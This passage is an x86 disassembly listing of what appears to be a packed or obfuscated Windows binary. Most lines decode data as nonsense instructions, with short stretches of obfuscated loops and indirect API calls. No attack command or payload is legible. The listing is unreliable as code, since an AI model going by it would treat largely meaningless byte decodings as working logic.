  40aa12:	ja     0x40aa42
  40aa14:	inc    esi
  40aa15:	cs leave 
  40aa17:	xchg   edx,eax
  40aa18:	push   esi
  40aa19:	mul    DWORD PTR [ebx+0x74290458]
  40aa1f:	das    
  40aa20:	test   al,0x12
  40aa22:	clc    
  40aa23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa24:	addr16 mov ds:0x8b14,al
  40aa28:	mov    bh,0x65
  40aa2a:	sbb    cl,ah
  40aa2c:	push   0x3dd2e8ec
  40aa31:	xchg   edi,eax
  40aa32:	jb     0x40aa87
  40aa34:	mov    cl,BYTE PTR [edi+ebx*8-0x48783d7]
  40aa3b:	mov    ch,0x96
  40aa3d:	pushf  
  40aa3e:	cmp    esi,esi
  40aa40:	sub    BYTE PTR [edx],0x90
  40aa43:	mov    ch,0x4f
  40aa45:	daa    
  40aa46:	sub    DWORD PTR [esi],0x2a00bd90
  40aa4c:	test   BYTE PTR [esi+0x17],al
  40aa4f:	popf   
  40aa50:	repnz repnz loopne 0x40aa0a
  40aa54:	push   ecx
  40aa55:	push   esi
  40aa56:	iret   
  40aa57:	mov    bl,0x41
  40aa59:	push   ds
  40aa5a:	test   cl,ah
  40aa5c:	(bad)  
  40aa5d:	(bad)  
  40aa5e:	call   0xe783543a
  40aa63:	mov    ds:0xff4621d5,eax
  40aa68:	xor    eax,0xed660ba3
  40aa6d:	push   ds
  40aa6e:	adc    BYTE PTR [esi-0x2fcc959c],0x81
  40aa75:	adc    eax,0x4345d3
  40aa7a:	inc    DWORD PTR [ebp+0x43]
  40aa7d:	add    BYTE PTR [ebx],al
  40aa7f:	shr    ecx,1
  40aa81:	jno    0x40aa9d
  40aa83:	add    BYTE PTR [eax],al
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x434573,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x43467b
  40aa9b:	sub    ebx,DWORD PTR ds:0x43468b
  40aaa1:	mov    DWORD PTR ds:0x43467b,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x43463b
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	ins    BYTE PTR es:[edi],dx
  40aacb:	and    ecx,DWORD PTR [ecx]
  40aacd:	xchg   edx,eax
  40aace:	cld    
  40aacf:	(bad)  
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	fild   QWORD PTR [ecx+0x2c]
  40aad9:	mov    dl,0x80
  40aadb:	sar    BYTE PTR [edx-0x517b0daa],1
  40aae1:	pushf  
  40aae2:	sub    esi,DWORD PTR [edx-0x7f]
  40aae5:	pop    edi
  40aae6:	and    al,0x48
  40aae8:	push   edx
  40aae9:	cmp    BYTE PTR [edx+0x10dbd150],dl
  40aaef:	repnz pop ss
  40aaf1:	scas   eax,DWORD PTR es:[edi]
  40aaf2:	ja     0x40aa86
  40aaf4:	lock and edx,DWORD PTR [edi-0x2b39b980]
  40aafb:	xor    DWORD PTR gs:[eax-0x20118f0a],esp
  40ab02:	lods   al,BYTE PTR ds:[esi]
  40ab03:	push   ebp
  40ab04:	pop    eax
  40ab05:	inc    ebp
  40ab06:	aaa    
  40ab07:	fimul  DWORD PTR [ebp-0x6f]
  40ab0a:	or     eax,0x54776f8
  40ab0f:	arpl   WORD PTR [edx],cx
  40ab11:	lods   eax,DWORD PTR ds:[esi]
  40ab12:	push   ebx
  40ab13:	mov    ebx,gs
  40ab15:	inc    eax
  40ab16:	push   ebx
  40ab17:	xchg   esp,eax
  40ab18:	sti    
  40ab19:	sbb    edx,edx
  40ab1b:	(bad)  
  40ab1c:	xor    esi,DWORD PTR [esi]
  40ab1e:	add    DWORD PTR [ecx-0x65],eax
  40ab21:	outs   dx,DWORD PTR ds:[esi]
  40ab22:	xchg   ebx,eax
  40ab23:	adc    bh,BYTE PTR [esi+0x516709bf]
  40ab29:	sub    ebx,ebp
  40ab2b:	mov    al,0x50
  40ab2d:	jge    0x40aad8
  40ab2f:	sbb    al,0x43
  40ab31:	retf   
  40ab32:	(bad)  
  40ab33:	mov    esi,0xcfce056e
  40ab38:	sub    ebp,DWORD PTR [edi-0x7d]
  40ab3b:	push   esp
  40ab3c:	cmp    BYTE PTR [ecx],dl
  40ab3e:	jg     0x40ab2d
  40ab40:	add    ch,BYTE PTR [edx-0x7]
  40ab43:	bsf    ebx,ecx
  40ab46:	add    ebp,eax
  40ab48:	push   ebp
  40ab49:	mov    BYTE PTR ds:0x65b6360d,bh
  40ab4f:	add    dh,BYTE PTR [edi]
  40ab51:	ror    DWORD PTR [ebx+edx*8],0x91
  40ab55:	xor    eax,0xc055743
  40ab5a:	aam    0xc9
  40ab5c:	add    DWORD PTR [ecx-0x1c5dfd0d],ebp
  40ab62:	add    BYTE PTR ds:0xd87461c2,dl
  40ab68:	push   edx
  40ab69:	dec    esp
  40ab6a:	inc    ebp
  40ab6b:	in     eax,dx
  40ab6c:	repz mov ecx,0x57c7efdc
  40ab72:	pop    edx
  40ab73:	xor    eax,0x960cf0e7
  40ab78:	rcr    DWORD PTR [edx+0x75],cl
  40ab7b:	jno    0x40abae
  40ab7d:	mov    ds:0xd563c7fb,al
  40ab82:	or     DWORD PTR [edi-0x1e],0xffffffbb
  40ab86:	xor    ch,al
  40ab88:	pusha  
  40ab89:	sahf   
  40ab8a:	jle    0x40ab26
  40ab8c:	aaa    
  40ab8d:	xchg   edi,eax
  40ab8e:	or     eax,ecx
  40ab90:	add    BYTE PTR [ebx+0x7b],ch
  40ab93:	add    al,0x77
  40ab95:	mov    DWORD PTR [esi+0x68ea97ce],edi
  40ab9b:	in     eax,0x33
  40ab9d:	cli    
  40ab9e:	ret    0x37d2
  40aba1:	push   ss
  40aba2:	and    esp,edi
  40aba4:	sbb    DWORD PTR [edi+edx*8+0x64],eax
  40aba8:	mov    BYTE PTR [edi-0x5e048435],bh
  40abae:	and    eax,0xeb6017bf
  40abb3:	inc    ecx
  40abb4:	loop   0x40aba3
  40abb6:	jle    0x40abb1
  40abb8:	int3   
  40abb9:	icebp  
  40abba:	aaa    
  40abbb:	mov    esi,0x975364cb
  40abc0:	mov    WORD PTR [edi+0x7d],?
  40abc3:	or     al,0x3f
  40abc5:	add    DWORD PTR [ebp+0x3a],edi
  40abc8:	jl     0x40abc1
  40abca:	push   ds
  40abcb:	repz mov ecx,0x9ceeb320
  40abd1:	sub    ecx,edx
  40abd3:	lods   eax,DWORD PTR ds:[esi]
  40abd4:	pop    es
  40abd5:	retf   
  40abd6:	push   edi
  40abd7:	add    ebx,DWORD PTR [ecx+0x25796312]
  40abdd:	push   0x737985d1
  40abe2:	imul   DWORD PTR [eax-0x417a67b9]
  40abe8:	cwde   
  40abe9:	int    0xb4
  40abeb:	sub    DWORD PTR [ebp+esi*2+0x56],ebp
  40abef:	add    bl,BYTE PTR [edx]
  40abf1:	and    al,0x9f
  40abf3:	cs mov edi,0xc66ee0f0
  40abf9:	or     al,dl
  40abfb:	test   edi,eax
  40abfd:	aaa    
  40abfe:	sub    cl,0x1c
  40ac01:	xor    BYTE PTR [esi-0x3e5ef598],dh
  40ac07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac08:	sti    
  40ac09:	mov    al,ds:0x45878016
  40ac0e:	adc    dl,cl
  40ac10:	call   0xecca6438
  40ac15:	push   eax
  40ac16:	dec    esi
  40ac17:	adc    al,0xb2
  40ac19:	call   0x34d012ba
  40ac1e:	mov    BYTE PTR [eax+0x13],ah
  40ac21:	sub    al,0xf1
  40ac23:	arpl   dx,di
  40ac25:	pop    ds
  40ac26:	in     al,dx
  40ac27:	jmp    0x40aca7
  40ac29:	dec    esp
  40ac2a:	dec    ebx
  40ac2b:	cwde   
  40ac2c:	call   0x5f9a:0x222d9b9c
  40ac33:	dec    ebx
  40ac34:	in     eax,0x8
  40ac36:	popa   
  40ac37:	cli    
  40ac38:	cmp    BYTE PTR [eax+0x49],dl
  40ac3b:	mov    dh,0xba
  40ac3d:	jge    0x40aca0
  40ac3f:	aas    
  40ac40:	daa    
  40ac41:	sub    dl,ch
  40ac43:	push   ds
  40ac44:	rol    bl,0x62
  40ac47:	jg     0x40ac05
  40ac49:	mov    gs:0xa01b5fa3,eax
  40ac4f:	and    ebp,esi
  40ac51:	push   esi
  40ac52:	cmp    ah,BYTE PTR [esp+ecx*2]
  40ac55:	or     DWORD PTR [ebx+0x3c],0x94c5a23a
  40ac5c:	and    DWORD PTR [ecx],ebp
  40ac5e:	add    DWORD PTR ds:0x3bcbbd35,edx
  40ac64:	sub    eax,0xeefbe7e8
  40ac69:	(bad)  
  40ac6a:	mov    ss,WORD PTR [edx]
  40ac6c:	popa   
  40ac6d:	(bad)  
  40ac70:	arpl   WORD PTR [edi],sp
  40ac72:	pop    edi
  40ac73:	or     BYTE PTR [edi],0x82
  40ac76:	mov    bh,0x46
  40ac78:	or     BYTE PTR [edx+0x7a],al
  40ac7b:	loopne 0x40ac61
  40ac7d:	adc    edx,DWORD PTR ds:0xbdd42097
  40ac83:	push   es
  40ac84:	fs mov ebx,0x98ae5b5e
  40ac8a:	push   ds
  40ac8b:	outs   dx,BYTE PTR ds:[esi]
  40ac8c:	out    0x6b,eax
  40ac8e:	loop   0x40ac3c
  40ac90:	hlt    
  40ac91:	xchg   ecx,eax
  40ac92:	mov    ebp,0x825e08a6
  40ac97:	cmc    
  40ac98:	iret   
  40ac99:	loope  0x40ac50
  40ac9b:	pop    ecx
  40ac9c:	mov    dl,0x3c
  40ac9e:	test   BYTE PTR [edi],bh
  40aca0:	jl     0x40ad07
  40aca2:	xor    eax,0x5b236651
  40aca7:	adc    edx,ecx
  40aca9:	push   0x63059e6f
  40acae:	mov    edx,0x9a9a2ca9
  40acb3:	mov    ds:0x6488b4eb,al
  40acb8:	inc    edi
  40acb9:	test   al,0xa1
  40acbb:	dec    ebx
  40acbc:	stos   DWORD PTR es:[edi],eax
  40acbd:	push   0x56
  40acbf:	mov    esp,0x323b701f
  40acc4:	sub    al,0x56
  40acc6:	lock fwait
  40acc8:	not    BYTE PTR [ebp-0x3b]
  40accb:	lods   al,BYTE PTR ds:[esi]
  40accd:	push   ss
  40acce:	or     BYTE PTR [esi],dh
  40acd0:	pcmpgtb mm4,QWORD PTR [esi]
  40acd3:	lock cmp ch,BYTE PTR [edi]
  40acd6:	xlat   BYTE PTR ds:[ebx]
  40acd7:	mov    DWORD PTR [eax-0x45],0xda0d701e
  40acde:	enter  0xd577,0x6
  40ace2:	xor    eax,0x6b335f0b
  40ace7:	or     bl,BYTE PTR [edx+0x19cc153d]
  40aced:	pop    eax
  40acee:	out    0xcb,eax
  40acf0:	adc    eax,0x1bea89e9
  40acf5:	jg     0x40ad3c
  40acf7:	jns    0x40ad2e
  40acf9:	push   ebx
  40acfa:	jbe    0x40ac7f
  40acfc:	loope  0x40acec
  40acfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acff:	pop    es
  40ad00:	leave  
  40ad01:	out    dx,eax
  40ad02:	mov    ecx,DWORD PTR [ebp+esi*2-0x3b]
  40ad06:	lahf   
  40ad07:	sti    
  40ad08:	mov    ah,0x60
  40ad0a:	push   es
  40ad0b:	pop    ss
  40ad0c:	jnp    0x40acc0
  40ad0e:	jmp    0x3183dc1d
  40ad13:	test   BYTE PTR [ebx],dh
  40ad15:	add    ebp,eax
  40ad17:	or     esi,DWORD PTR [edx-0x6626152b]
  40ad1d:	dec    esp
  40ad1e:	dec    ebp
  40ad1f:	mov    ds:0x9fb92983,eax
  40ad24:	ret    
  40ad25:	mov    ch,0x88
  40ad27:	lea    edi,[edx-0x21]
  40ad2a:	stc    
  40ad2b:	int3   
  40ad2c:	lock ds mov edx,0x38e8a05d
  40ad33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad34:	out    dx,eax
  40ad35:	hlt    
  40ad36:	sti    
  40ad37:	in     eax,0xc5
  40ad39:	retf   
  40ad3a:	aad    0xbd
  40ad3c:	mov    ebp,0xb7d16531
  40ad41:	mov    al,0x64
  40ad43:	lods   al,BYTE PTR ds:[esi]
  40ad44:	jb     0x40ad7f
  40ad46:	fstp   DWORD PTR [esi]
  40ad48:	ins    BYTE PTR es:[edi],dx
  40ad49:	leave  
  40ad4a:	mov    eax,0x54277c6a
  40ad4f:	mov    bl,0x90
  40ad51:	in     al,dx
  40ad52:	and    esi,DWORD PTR [ebx]
  40ad54:	aaa    
  40ad55:	pop    edi
  40ad56:	(bad)  
  40ad57:	(bad)  
  40ad59:	jno    0x40ad3f
  40ad5b:	adc    DWORD PTR [esi-0x36c5a46b],0xffffffa0
  40ad62:	sahf   
  40ad63:	pusha  
  40ad64:	shl    al,0x1c
  40ad67:	jmp    0x40ad5c
  40ad69:	stos   DWORD PTR es:[edi],eax
  40ad6a:	in     eax,dx
  40ad6b:	or     dh,BYTE PTR [edx]
  40ad6d:	dec    ecx
  40ad6e:	int3   
  40ad6f:	pop    ecx
  40ad71:	jmp    0x93fe:0x296ac944
  40ad78:	aas    
  40ad79:	pop    ebx
  40ad7a:	pop    ebp
  40ad7b:	and    al,0x3d
  40ad7d:	call   0x88be:0x5d446583
  40ad84:	push   ds
  40ad85:	and    BYTE PTR [ebp-0x7c897af6],bh
  40ad8b:	rcr    bh,1
  40ad8d:	xchg   esi,eax
  40ad8e:	xchg   ebp,esp
  40ad90:	cli    
  40ad91:	je     0x40adf6
  40ad93:	mov    cs,WORD PTR [edi]
  40ad95:	nop
  40ad96:	out    0x67,al
  40ad98:	gs push edi
  40ad9a:	adc    eax,0x98695a76
  40ad9f:	inc    ebp
  40ada0:	jge    0x40ad75
  40ada2:	ins    BYTE PTR es:[edi],dx
  40ada3:	scas   al,BYTE PTR es:[edi]
  40ada4:	or     BYTE PTR [esi-0x40],bl
  40ada7:	xor    al,0x2b
  40ada9:	xlat   BYTE PTR ds:[ebx]
  40adaa:	cmp    al,0xef
  40adac:	cmc    
  40adad:	cmp    edi,edx
  40adaf:	clc    
  40adb0:	mov    edx,DWORD PTR [ebx]
  40adb2:	in     eax,0xb1
  40adb4:	or     BYTE PTR [ecx-0x5ab0a63e],al
  40adba:	xor    eax,0x4b13595f
  40adbf:	loope  0x40adc7
  40adc1:	jg     0x40ad76
  40adc3:	nop
  40adc4:	fwait
  40adc5:	int    0x27
  40adc7:	je     0x40ae18
  40adc9:	iret   
  40adca:	cmp    BYTE PTR [esi+eax*8-0x3d],ah
  40adce:	cmc    
  40adcf:	int    0x58
  40add1:	rcl    BYTE PTR [edi+eiz*4],cl
  40add4:	jge    0x40adff
  40add6:	sub    eax,0x88441348
  40addb:	clc    
  40addc:	inc    ebx
  40addd:	(bad)  
  40adde:	fadd   st(6),st
  40ade0:	xchg   esi,eax
  40ade1:	sbb    ebp,0x7d
  40ade4:	pop    eax
  40ade5:	or     ecx,DWORD PTR [edx]
  40ade7:	mov    ebp,edi
  40ade9:	ins    DWORD PTR es:[edi],dx
  40adea:	xchg   DWORD PTR [edi-0x4a],esp
  40aded:	xlat   BYTE PTR ds:[ebx]
  40adee:	loop   0x40adcb
  40adf0:	ret    0x6f48
  40adf3:	sub    eax,esi
  40adf5:	repnz mov esi,0xe7d5f635
  40adfb:	loop   0x40adc8
  40adfd:	mov    dh,0x1a
  40adff:	mov    eax,ds:0x3a3faabe
  40ae04:	cmp    BYTE PTR [ecx+0x3073f6b1],cl
  40ae0a:	test   dl,bh
  40ae0c:	xchg   DWORD PTR [esi],edx
  40ae0e:	fistp  QWORD PTR [ebp-0x35]
  40ae11:	sub    ebx,DWORD PTR [edi-0x5c51d90]
  40ae17:	fcmovnu st,st(6)
  40ae19:	dec    ebx
  40ae1a:	jmp    0x40ae2d
  40ae1c:	leave  
  40ae1d:	in     eax,0x84
  40ae1f:	shl    DWORD PTR [edx+0x27bd3245],1
  40ae25:	sub    DWORD PTR [ebp+0x4a],0xffffffe6
  40ae29:	imul   ecx,DWORD PTR [ecx],0x58
  40ae2c:	lea    ecx,[edi+0x7c2a6ad3]
  40ae32:	push   ecx
  40ae33:	mov    ebx,0xd8c485fe
  40ae38:	or     BYTE PTR [eax+0x4f],cl
  40ae3b:	jle    0x40ade1
  40ae3d:	mov    BYTE PTR ds:[eax],dl
  40ae40:	idiv   DWORD PTR [esp+ecx*2]
  40ae43:	je     0x40ae67
  40ae45:	adc    DWORD PTR ds:0x29e6e175,ebx
  40ae4b:	mov    ecx,0xb7868456
  40ae50:	mov    eax,0xe5c2924f
  40ae55:	sti    
  40ae56:	jns    0x40ae86
  40ae58:	out    dx,al
  40ae59:	jae    0x40ae36
  40ae5b:	into   
  40ae5c:	adc    ebx,DWORD PTR fs:[esi+0x3b06404d]
  40ae63:	fimul  WORD PTR [ebp-0x5cf414da]
  40ae69:	in     al,0x13
  40ae6b:	or     BYTE PTR [ecx+0x6e3771e0],dh
  40ae71:	(bad)  
  40ae73:	mov    WORD PTR [edi],es
  40ae75:	push   0xe58d5151
  40ae7a:	xor    al,0x1
  40ae7c:	xor    ebp,DWORD PTR [edi+esi*2-0x3a4b4ddd]
  40ae83:	retf   0x4be3
  40ae86:	enter  0x7226,0x7e
  40ae8a:	sub    bh,dh
  40ae8c:	and    BYTE PTR [eax+ebp*4-0x55dd7ec4],ah
  40ae93:	rcr    dh,cl
  40ae95:	retf   0x356c
  40ae98:	retf   0x9c87
  40ae9b:	dec    WORD PTR [eax+0x38]
  40ae9f:	repz push edi
  40aea1:	add    eax,0x165566aa
  40aea6:	ins    DWORD PTR es:[edi],dx
  40aea7:	fstp   TBYTE PTR [edx-0x4d]
  40aeaa:	sub    ecx,DWORD PTR [edi]
  40aeac:	leave  
  40aead:	mov    ah,0xbf
  40aeaf:	out    dx,al
  40aeb0:	dec    eax
  40aeb1:	mov    edi,0x7e283068
  40aeb6:	push   DWORD PTR [eax]
  40aeb8:	jae    0x40aedb
  40aeba:	cs (bad) 
  40aebc:	xchg   ebx,eax
  40aebd:	rol    edi,cl
  40aebf:	mov    esi,0xa4c2bb8a
  40aec4:	jge    0x40ae49
  40aec6:	adc    al,0xe3
  40aec8:	jg     0x40aebe
  40aeca:	fdivrp st(5),st
  40aecc:	push   ds
  40aecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aece:	push   ebx
  40aecf:	call   0xaf507fd7
  40aed4:	xlat   BYTE PTR ds:[ebx]
  40aed5:	xor    ebx,DWORD PTR ds:0x4345d3
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x4345c7,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x4345bf,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x43467f,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43460f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x43456f,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x4345bb,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x4345c7,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x4345c7
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x4345c7,ebx
  40af4d:	cmp    DWORD PTR ds:0x4345c7,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x4345c7,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x4345f7
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43460b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434693,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434693
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434693,ebx
  40afaa:	cmp    DWORD PTR ds:0x434693,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434693,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	push   cs
  40affc:	adc    DWORD PTR [ebx+eiz*8],ebp
  40afff:	idiv   dl
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	and    DWORD PTR [esi+eax*4-0x4d606945],ebx
  40b00e:	js     0x40afdf
  40b010:	aas    
  40b011:	jns    0x40b033
  40b013:	ins    DWORD PTR es:[edi],dx
  40b014:	cmp    al,0xcb
  40b016:	popa   
  40b017:	mov    esi,0x82ffa7a6
  40b01c:	rcl    DWORD PTR [edi],0x20
  40b01f:	mov    ds:0x41dcc20a,al
  40b024:	xor    al,0xaa
  40b026:	jl     0x40b01c
  40b028:	and    eax,0x1ffaffbb
  40b02d:	push   esi
  40b02e:	aad    0xc0
  40b030:	and    eax,0xe8e721bc
  40b035:	aas    
  40b036:	shl    DWORD PTR [edx+0x1bf26721],0x72
  40b03d:	xor    cl,BYTE PTR [ebx+0x1d]
  40b040:	inc    ebx
  40b041:	sub    esp,0x26b4dda
  40b047:	das    
  40b048:	sbb    ecx,eax
  40b04a:	pop    ds
  40b04b:	pop    ebx
  40b04c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b04d:	sub    ah,cl
  40b04f:	loope  0x40b02b
  40b051:	or     ebp,DWORD PTR [edi+0xd59888e]
  40b057:	jo     0x40aff0
  40b059:	cld    
  40b05a:	pop    ecx
  40b05b:	xor    esi,DWORD PTR [edi-0x4f]
  40b05e:	and    eax,0x1b3f74fc
  40b063:	pop    ebx
  40b064:	push   0xe7bc12e1
  40b069:	sbb    BYTE PTR [eax+edx*2-0x39],ch
  40b06d:	sub    cl,BYTE PTR [edx+0x40a2ce8]
  40b073:	adc    al,0x55
  40b075:	sbb    ebp,esp
  40b077:	inc    edi
  40b078:	rcl    BYTE PTR [edi-0x5f9b71b2],1
  40b07e:	call   0x3729735d
  40b083:	int    0x52
  40b085:	dec    esi
  40b086:	adc    esi,DWORD PTR [eax]
  40b088:	aam    0x8c
  40b08a:	leave  
  40b08b:	push   cs
  40b08c:	shr    BYTE PTR [esi],1
  40b08e:	push   0xd036323
  40b093:	mov    cl,0xf8
  40b095:	push   edi
  40b096:	xchg   BYTE PTR ds:[ecx+0x2c],dl
  40b09a:	retf   0xa657
  40b09d:	pop    ecx
  40b09e:	cdq    
  40b09f:	out    dx,eax
  40b0a0:	jp     0x40b065
  40b0a2:	pop    es
  40b0a3:	xchg   DWORD PTR [eax],esi
  40b0a5:	sbb    bh,bl
  40b0a7:	ds inc edi
  40b0a9:	mov    ecx,DWORD PTR [edi-0x3c64a1b4]
  40b0af:	icebp  
  40b0b0:	push   0x1fc66393
  40b0b5:	lods   al,BYTE PTR ds:[esi]
  40b0b6:	pop    esp
  40b0b7:	sbb    BYTE PTR [esi-0x50a585d2],0xb0
  40b0be:	push   edi
  40b0bf:	aas    
  40b0c0:	in     eax,dx
  40b0c1:	or     BYTE PTR [eax+ebx*2-0x22712c6b],0x30
  40b0c9:	cld    
  40b0ca:	adc    DWORD PTR [edi-0x74],esp
  40b0cd:	ins    BYTE PTR es:[edi],dx
  40b0ce:	sub    eax,0x9f57280f
  40b0d3:	jbe    0x40b0d3
  40b0d5:	and    al,cl
  40b0d7:	sbb    bl,BYTE PTR [edi+0x35]
  40b0da:	sbb    al,0x22
  40b0dc:	into   
  40b0dd:	aaa    
  40b0de:	mov    cl,0x58
  40b0e0:	xor    DWORD PTR [ebx],ecx
  40b0e2:	dec    ebx
  40b0e3:	loopne 0x40b143
  40b0e5:	aas    
  40b0e6:	leave  
  40b0e7:	dec    esi
  40b0e8:	jns    0x40b0a8
  40b0ea:	aaa    
  40b0eb:	sar    DWORD PTR [ebp-0x44390860],1
  40b0f1:	mov    eax,ds:0xff2a88c2
  40b0f6:	sti    
  40b0f7:	xchg   ebp,eax
  40b0f8:	cmp    eax,DWORD PTR [esi]
  40b0fa:	jp     0x40b15f
  40b0fc:	add    BYTE PTR [ecx],bl
  40b0fe:	je     0x40b0ca
  40b100:	outs   dx,BYTE PTR ds:[esi]
  40b101:	xchg   edx,eax
  40b102:	int    0xf
  40b104:	mov    cl,0x75
  40b106:	(bad)  
  40b108:	(bad)  
  40b109:	nop
  40b10a:	test   DWORD PTR [esp+ecx*2-0x1668bfe2],ebx
  40b111:	mov    al,0xd5
  40b113:	push   esi
  40b114:	sub    eax,0xe9f4428b
  40b119:	or     eax,0xf1771034
  40b11e:	mov    edi,0xfd657ce4
  40b123:	sbb    DWORD PTR [ebx+0x4c6cda94],eax
  40b129:	xor    eax,0xcc72974f
  40b12e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b130:	leave  
  40b131:	jb     0x40b198
  40b133:	cmp    esp,DWORD PTR [ebx+edi*2-0x1a]
  40b137:	add    BYTE PTR [edx-0xb446570],ah
  40b13d:	rcl    DWORD PTR [eax+edx*8+0x2ee538e7],cl
  40b144:	ror    BYTE PTR [esi+0x56814c85],cl
  40b14a:	stos   BYTE PTR es:[edi],al
  40b14b:	inc    eax
  40b14c:	ds (bad) 
  40b14e:	fst    DWORD PTR [ecx]
  40b150:	and    BYTE PTR [eax],dl
  40b152:	push   0x305bce37
  40b157:	or     ebp,DWORD PTR [ebx+0x47]
  40b15a:	mov    ebx,0x551689b6
  40b15f:	cwde   
  40b160:	ficomp DWORD PTR [ebx]
  40b162:	inc    eax
  40b163:	out    dx,al
  40b164:	mov    al,0x3
  40b166:	(bad)  
  40b168:	out    dx,al
  40b169:	data16 fist WORD PTR [ebp-0x37e281f]
  40b170:	test   eax,0x505e19fd
  40b175:	inc    ebx
  40b176:	les    esi,FWORD PTR [edi]
  40b178:	add    al,BYTE PTR [ebx-0xef9f03f]
  40b17e:	fmulp  st(2),st
  40b180:	leave  
  40b181:	xchg   esp,eax
  40b182:	inc    ebp
  40b183:	add    dh,BYTE PTR [esi]
  40b185:	leave  
  40b186:	adc    eax,0x2861fdb8
  40b18b:	dec    edi
  40b18c:	dec    edx
  40b18d:	mov    ebp,0x73d9735c
  40b192:	call   0x43ce:0x52a9764
  40b199:	add    al,0x5e
  40b19b:	pop    ebp
  40b19c:	mov    ebp,DWORD PTR [edx]
  40b19e:	mov    ah,0xf1
  40b1a0:	cmp    al,ch
  40b1a2:	jo     0x40b201
  40b1a4:	push   0x3a274ec3
  40b1a9:	sbb    edi,DWORD PTR [ebx+0x32]
  40b1ac:	push   ss
  40b1ad:	and    bh,dh
  40b1af:	xchg   esp,eax
  40b1b0:	inc    eax
  40b1b1:	lock loopne 0x40b161
  40b1b4:	mov    ebx,0xf0d26214
  40b1b9:	test   eax,0xe68e78de
  40b1be:	sub    edx,DWORD PTR [ecx+edi*2+0x8]
  40b1c2:	aas    
  40b1c3:	and    eax,0x457169
  40b1c8:	inc    edx
  40b1c9:	push   esp
  40b1ca:	cmp    al,0xb2
  40b1cc:	inc    esi
  40b1cd:	inc    esp
  40b1ce:	push   ecx
  40b1cf:	mov    al,ds:0xa9326596
  40b1d5:	jne    0x40b1ec
  40b1d7:	repz add al,0xbc
  40b1da:	cdq    
  40b1db:	out    dx,al
  40b1dc:	dec    edi
  40b1dd:	test   esp,esp
  40b1df:	mov    dh,0x24
  40b1e1:	xor    ah,BYTE PTR [ecx]
  40b1e3:	(bad)  
  40b1e4:	test   al,0xf4
  40b1e7:	(bad)  
  40b1e8:	dec    edx
  40b1e9:	imul   ebp,DWORD PTR [edi+0x22],0x84d903cb
  40b1f0:	fidivr WORD PTR [eax+0x1e49257]
  40b1f6:	in     eax,0xf2
  40b1f8:	push   0xffffffa6
  40b1fa:	enter  0x5c62,0x67
  40b1fe:	jae    0x40b1b0
  40b200:	js     0x40b23a
  40b202:	cmp    eax,DWORD PTR [esi+edi*1-0x35ae7c49]
  40b209:	enter  0xced8,0xc3
  40b20d:	pop    ebx
  40b20e:	call   0xec6dedfb
  40b213:	and    BYTE PTR [ebp+0x29],dh
  40b216:	sub    esi,esi
  40b218:	ins    BYTE PTR es:[edi],dx
  40b219:	loope  0x40b28b
  40b21b:	sub    DWORD PTR [edx-0x3b],0xffffffa6
  40b21f:	jb     0x40b237
  40b221:	inc    edi
  40b222:	jle    0x40b1d7
  40b224:	xchg   edx,eax
